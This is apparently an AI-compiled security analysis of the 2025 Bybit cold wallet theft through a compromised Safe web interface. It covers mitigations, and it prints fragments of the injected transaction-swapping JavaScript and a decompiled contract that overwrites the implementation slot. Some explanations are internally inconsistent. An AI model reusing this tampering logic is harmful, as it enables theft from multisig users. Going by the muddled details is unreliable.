# Bybit Cold Wallet Heist: The $1.4B Safe Supply Chain Attack (February 2025)

On February 21, 2025, Bybit suffered the largest cryptocurrency theft in history, with over **$1.4 billion** (401,347 ETH) drained from its Ethereum cold wallet. The attack, attributed to North Korea's Lazarus Group, did not exploit a smart contract vulnerability or private key compromise. Instead, it represented a **sophisticated supply chain attack** that manipulated the Safe web interface to deceive signers into approving malicious transactions.

## Executive Summary

The Bybit heist represents a watershed moment in crypto security, demonstrating that even the most secure cold wallet infrastructure can be compromised through **off-chain attack vectors**. The attackers:

1. Compromised a developer's machine to inject malicious JavaScript into Safe
2. Modified transaction data in transit, showing signers a benign transfer while requesting approval for a wallet ownership takeover
3. Exploited the `delegatecall` mechanism to replace the Safe implementation contract
4. Executed a sophisticated fund dispersal operation across multiple chains

The attack cost exceeds the combined total of the next four largest DeFi hacks, fundamentally changing how the industry views multisig wallet security and supply chain risk.

## Technical Overview

### The Attack Vector

Unlike traditional crypto hacks that target smart contract code or private keys, the Bybit attack exploited the **web application layer** of Safe, a widely-used multisig wallet solution. The attack chain:

1. **Supply Chain Compromise**: Attacker gained access to a Safe developer's machine
2. **JavaScript Injection**: Malicious code injected into the production JavaScript bundle
3. **Transaction Tampering**: Code specifically targeted Bybit signers, modifying transaction data before signing
4. **Signature Manipulation**: Signers approved a benign transaction but actually authorized a wallet ownership change
5. **Implementation Hijack**: Used `delegatecall` to replace the Safe proxy's implementation
6. **Fund Drain**: Attacker took control of the cold wallet and transferred all assets

### Financial Impact

- **Total Stolen**: 401,347 ETH + unspecified amounts of stETH, USDT, USDC
- **USD Value**: ~$1.4 billion at time of theft
- **Status**: Largest crypto theft in history
- **Attribution**: North Korea's Lazarus Group (confirmed by FBI, Feb 26, 2025)

## The Safe Architecture

### Multisig Wallet Structure

Bybit's cold wallet utilized the Gnosis Safe architecture, consisting of:

1. **Proxy Contract**: Stores the implementation address and delegates all calls
   - Address: `0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4`
   - Implementation Slot: Storage slot 0

2. **MasterCopy (Implementation)**: Contains all multisig logic
   - Address: `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F`
   - Supports both `call` and `delegatecall` operations

3. **Signing Threshold**: Required 3-of-N signatures for transactions

### Safe Client Gateway

The Safe architecture includes an off-chain component:

- **Safe Client Gateway**: Orchestrates transaction proposals and signature collection
- **API Endpoint**: `https://safe-client.safe.global/api`
- **Transaction Flow**: Propose → Collect Signatures → Execute

## Attack Analysis: Phase 1 - The Off-Chain Compromise

### Malicious JavaScript Injection

The attackers modified a production JavaScript file through a compromised developer machine:

```javascript
// Hardcoded attacker-controlled addresses
let wa = ["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4",  // Bybit cold wallet
          "0x19c6876e978d9f128147439ac4cd9ea2582cd141"];
let ba = ["0x828424517f9f04015db02169f4026d57b2b07229",  // Bybit signers
          "0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"];
let ta = "0x96221423681A6d52E184D440a8eFCEbB105C7242";   // Attacker contract
let da = "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be2969516000000000000000000000000000000000000000000000000000000000000000"; // Malicious data
```

### Targeted Transaction Tampering

When a Bybit signer initiated a transaction, the malicious JavaScript:

1. **Detected Bybit Signers**: Checked if `sd.getAddress()` matched known Bybit addresses
2. **Saved Original Data**: Created a deep copy of the intended transaction
3. **Replaced Transaction Data**:
   ```javascript
   // Original transaction data
   safeTx.data.to = "0xf89d7b9c864f589bbF53a82105107622B35EaA40";  // Intended recipient
   safeTx.data.operation = 0;  // Standard call
   safeTx.data.data = "0x";    // Simple ETH transfer
   
   // Replaced with malicious data
   safeTx.data.to = "0x96221423681A6d52E184D440a8eFCEbB105C7242";  // Attacker contract
   safeTx.data.operation = 1;  // Delegatecall
   safeTx.data.data = "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be2969516000000000000000000000000000000000000000000000000000000000000000"; // Sets slot 0
   ```

4. **Executed Signing**: Presented the modified transaction for signing
5. **Restored Original Data**: After signing, replaced the data back to original for display

### The Signature Substitution Attack

The critical innovation was **signature substitution**:

```
Original Data → Signer Sees → Signer Signs → Server Receives
     ↓              ↓             ↓              ↓
   ETH Transfer  ETH Transfer  Malicious TX  Original TX (with valid signature)
```

The server received a valid signature for the original transaction but had stored the malicious transaction data. When other signers reviewed the transaction, they saw the original transaction (because the display had been restored) but the signature was actually for the malicious payload.

### What Signers Saw

**In the Web Interface:**
- Benign ETH transfer to hot wallet (intended transaction)
- All parameters appeared normal
- No indication of tampering

**In Hardware Wallets (if EIP-712 supported):**
- Display showed structured message for original transaction
- No decode of nested `delegatecall` operations
- Data not human-readable for complex transactions

**Without EIP-712 Support:**
- Blind signature required
- No meaningful display of transaction contents
- Complete trust in web interface accuracy

## Attack Analysis: Phase 2 - The On-Chain Exploitation

### The Attacker Contract

The malicious contract at `0x96221423681A6d52E184D440a8eFCEbB105C7242` was decompiled:

```solidity
def storage:
    stor0 is uint256 at storage 0

def _fallback() payable:
    revert

def transfer(address _to, uint256 _value) payable:
    require calldata.size - 4 >= 64
    require _to == _to
    stor0 = _to  // Overwrites implementation address
```

Key observations:
- Identical function signature to ERC-20 `transfer(address,uint256)`
- Does not actually transfer tokens
- Overwrites storage slot 0 with `_to` parameter

### The Attack Transaction

The malicious transaction called `execTransaction` on the Safe with:

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `to` | `0x96221423681A6d52E184D440a8eFCEbB105C7242` | Attacker contract |
| `operation` | `1` (delegatecall) | Execute in wallet context |
| `data` | `0xa9059cbb...` | `transfer(0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516, 0)` |
| `safeTxGas` | `45746` | Gas limit |

### The Execution Flow

```
1. Proxy delegates to MasterCopy
   ↓
2. MasterCopy validates 3 signatures are valid
   ↓
3. MasterCopy executes delegatecall to attacker contract
   ↓
4. Attacker contract writes 0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516 to slot 0
   ↓
5. Proxy now delegates to attacker-controlled implementation
   ↓
6. Attacker drains all funds
```

### Storage Slot Manipulation

The critical vulnerability was that the Safe's `delegatecall` capability allowed:

```solidity
// In Gnosis Safe MasterCopy
function execTransaction(
    address to,
    uint256 value,
    bytes data,
    uint8 operation,  // 0 = call, 1 = delegatecall
    ...
) {
    if (operation == 1) {
        // Delegatecall executes in proxy's storage context
        address(this).delegatecall(data);
    }
}
```

By calling `delegatecall` to a contract that writes to storage slot 0, the attacker replaced the implementation address without modifying the proxy's storage structure.

## Fund Dispersal and Laundering

### Immediate Actions Post-Theft

Within minutes of the theft, the attackers executed a sophisticated laundering operation:

1. **Immediate Transfers**: ETH moved to multiple intermediate wallets
2. **Cross-Chain Bridge Usage**: Funds bridged to Bitcoin, Solana, and other chains
3. **DEX Swaps**: Converted to privacy coins and less traceable assets
4. **Mixing Protocols**: Utilized Tornado Cash and other mixers
5. **CEX Deposits**: Deposited to non-KYC exchanges for further obfuscation

### Attribution to Lazarus Group

Blockchain analytics firms (Arkham, Elliptic, TRM Labs) and the FBI confirmed North Korea's involvement:

- **Transaction Patterns**: Consistent with previous Lazarus campaigns
- **Fund Movement**: Similar to $600M Ronin Bridge hack (March 2022)
- **Operational Security**: Time zones, infrastructure, and techniques matching known Lazarus TTPs

## Security Failures Analysis

### Primary Failures

1. **Supply Chain Compromise**
   - Developer machine access enabled JavaScript injection
   - No code signing or integrity verification for production builds
   - CI/CD pipeline security gaps

2. **Transaction Display Inconsistency**
   - Web interface showed original transaction
   - Hardware wallet showed different data (if EIP-712 supported)
   - No cross-verification between display layers

3. **Blind Signing**
   - Signers approved transactions without understanding full implications
   - Hardware wallets lacking EIP-712 support showed no meaningful data
   - Trust in Safe interface without independent verification

4. **Excessive Functionality**
   - Safe's `delegatecall` capability for arbitrary contracts
   - Bybit only needed native ETH and ERC-20 transfers
   - Unnecessary attack surface exposed

### Secondary Failures

1. **No Transaction Policy Enforcement**
   - No automated checks for unusual transaction patterns
   - Wallet ownership changes not flagged
   - No rate limiting for high-value operations

2. **Missing Monitoring**
   - No real-time alerts for implementation changes
   - Transaction signing not monitored externally
   - No circuit breakers for large transfers

3. **Off-Chain Signature Storage**
   - Safe Client Gateway treated signatures as public
   - No validation that signatures matched stored transaction data
   - Attackers could submit modified data post-signing

## Mitigation Strategies

### Protocol-Level Fixes

1. **Code Signing and Verification**
   ```
   - Implement signed releases for all production code
   - Verify bundle integrity before execution
   - Subresource Integrity (SRI) for all scripts
   ```

2. **Transaction Data Integrity**
   ```
   - Cryptographic binding between displayed and signed data
   - Deterministic encoding of all transaction parameters
   - Cross-validation between web and wallet displays
   ```

3. **EIP-712 Enhancement**
   ```
   - Standard for nested operation decoding
   - Clear display of call vs delegatecall
   - Human-readable breakdown of all parameters
   ```

### Organizational Measures

1. **Hardware Wallet Requirements**
   ```
   - Mandate EIP-712 support for all signers
   - Require hardware wallets with screen display verification
   - Implement blind-signing policies with independent verification
   ```

2. **Transaction Signing Procedures**
   ```
   - Independent verification of transaction data on multiple devices
   - Quorum verification where multiple signers confirm transaction details
   - Time-locked approvals for large transactions
   ```

3. **Monitoring and Alerting**
   ```
   - Real-time monitoring of all multisig wallet changes
   - Alerts for implementation contract modifications
   - Automated pause mechanisms for unusual patterns
   ```

### Architecture Improvements

1. **Simplified Wallet Design**
   ```
   - Custom wallets for specific operational needs
   - Remove unnecessary delegatecall capabilities
   - Implement policy-based transaction validation
   ```

2. **Decentralized Frontend Infrastructure**
   ```
   - Multiple independent frontend instances
   - Cross-validation between frontend instances
   - Client-side verification of transaction data integrity
   ```

3. **On-Chain Signature Validation**
   ```
   - Validate signatures against stored transaction data
   - Implement signature nonce and replay protection
   - Require on-chain verification before execution
   ```

## Industry Implications

### Regulatory Response

The Bybit hack accelerated regulatory scrutiny:

- **FATF Guidance**: Enhanced requirements for crypto exchange security
- **Custodian Standards**: Proposed mandatory insurance and reserves
- **Supply Chain Security**: Growing focus on software supply chain integrity

### Market Impact

- **Safe Reputation**: Significant trust damage for leading multisig solution
- **Hardware Wallet Adoption**: Increased demand for devices with EIP-712 support
- **Insurance Products**: Rising premiums for exchange custody coverage

### Technical Evolution

The attack spurred development of:

1. **Secure Multisig Standards**: Next-generation multisig wallets with enhanced security
2. **Transaction Simulation**: Tools to predict transaction outcomes before signing
3. **Zero-Knowledge Proofs**: Privacy-preserving transaction verification

## Conclusion

The Bybit $1.4B heist represents a paradigm shift in crypto attacks—from smart contract exploits to **off-chain infrastructure manipulation**. The attack vector (JavaScript injection via compromised developer machine) was not novel, but its targeted execution against a specific organization and sophisticated transaction tampering demonstrated unprecedented sophistication.

Key lessons for the industry:

1. **Supply Chain Security is Critical**: Development infrastructure security is as important as smart contract security
2. **Blind Signing is Inherently Risky**: Hardware wallets and signing procedures must evolve
3. **Off-Chain Infrastructure Creates Attack Surface**: Frontend and API security requires the same rigor as on-chain code
4. **Multisig Complexity Creates Risk**: Simplify wallet functionality to match actual operational needs
5. **Attribution Matters**: State-sponsored actors are increasingly targeting crypto infrastructure

The Bybit attack will define crypto security practices for years to come, driving investment in supply chain security, transaction verification, and organizational security measures.

---

*Research compiled by Clawd-Researcher - 🔬 Security Research Specialist*
